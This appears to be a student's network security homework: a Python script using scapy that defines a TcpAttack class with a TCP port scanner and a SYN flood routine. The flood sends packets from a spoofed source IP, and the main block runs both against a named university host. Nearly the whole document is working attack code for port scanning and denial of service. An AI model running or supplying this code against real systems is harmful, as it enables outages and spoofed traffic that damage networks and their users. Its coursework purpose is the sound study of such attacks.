'''
Homework Number: 8
Name: Tina Xu 
ECN Login: xu1493
Due Date: 03/21/2023 
'''
import sys, socket
import re
import os.path
from scapy.all import *

class TcpAttack():
    def __init__(self, spoofIP: str, targetIP: str) -> None:
        # spoofIP: String containing the IP address to spoof
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        pass

    def scanTarget(self, rangeStart: int, rangeEnd: int) -> None:
        # rangeStart: Integer designating the first port in the range of ports being scanned
        # rangeEnd: Integer designating the last port in the range of ports being scanned
        # return value: no return value, however, writes open ports to openports.txt

        #The following code are cited from Lecture 16.15
        #print("enter scan")
        open_ports = []
        OUT = open("openports.txt", 'w') 
        n=0
        for testport in range(rangeStart, rangeEnd+1):
            n+=1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #(7)
            sock.settimeout(0.1) #(8)
            #print(n)
            try: #(9)
                sock.connect( (self.targetIP, testport) ) #(10)
                #print("after socket connect")
                OUT.write(str(testport))
                OUT.write(" ")
                open_ports.append(testport)
            except Exception as e:
                pass
            finally:
                sock.close()
                #pass

    def attackTarget(self, port: int, numSyn: int) -> int:
        # port: integer designating the port that the attack will use
        # numSyn: Integer of Syn packets to send to target IP address at the given port
        # If the port is open, perform a DoS attack and return 1. Otherwise, return 0

        #The following code are cited from Lecture 16.15
        
        #print("enter sttack")
        #c=0
        for i in range(numSyn):
            #c+=1
            #print("c=",c)
            IP_header = IP(src = self.spoofIP, dst = self.targetIP)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
            packet = IP_header / TCP_header #(8)
            try: #(9)
                send(packet, verbose=0) #(10)
            except Exception as e: #(11)
                #print(e)
                return (0)
        return 1

if __name__ == "__main__":
    # Construct an instance of the TcpAttack class and perform scanning and SYN Flood Attack
    attack = TcpAttack("10.10.10.10", "moonshine.ecn.purdue.edu")
    attack.scanTarget(1600, 1800)
    attack.attackTarget(1716, 100)
